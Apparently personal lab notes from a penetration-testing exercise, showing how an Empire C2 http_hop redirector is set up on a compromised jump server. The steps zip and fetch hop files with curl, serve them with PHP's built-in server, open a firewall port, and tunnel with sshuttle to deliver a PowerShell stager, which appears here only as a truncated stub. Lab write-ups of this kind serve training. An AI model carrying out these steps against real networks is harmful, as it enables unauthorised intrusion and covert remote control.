
set Listener http_hop
![[Pasted image 20231231111814.png]]

save the provided command somewhere and _do not_ execute it yet. We will need it once we have set up the hop files on the jumpserver.

```
powershell -noP -sta -w 1 -enc  
```

```
cd /tmp/http_hop && zip -r hop.zip *
```
![[Pasted image 20231231113626.png]]

```
curl 10.50.102.187/hop.zip -o hop.zip
```
![[Pasted image 20231231113603.png]]

 We already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files ! 
```
php -S 0.0.0.0:47000 &>/dev/null &
```
![[Pasted image 20231231115139.png]]

![[Pasted image 20231231115435.png]]

To open the fort in the firewall otherwise it might block the traffic
```
firewall-cmd --zone=public --add-port 47000/tcp
```

Keep in mind that we have to run the sshuttle so that we communicate with git server and attacker machine so that we can send the empire stage payload.
![[Pasted image 20231231120928.png]]

We got the agent back when we run the burpsuite
![[Pasted image 20231231120902.png]]

So we have successfully setup up our Jump-server successfully.
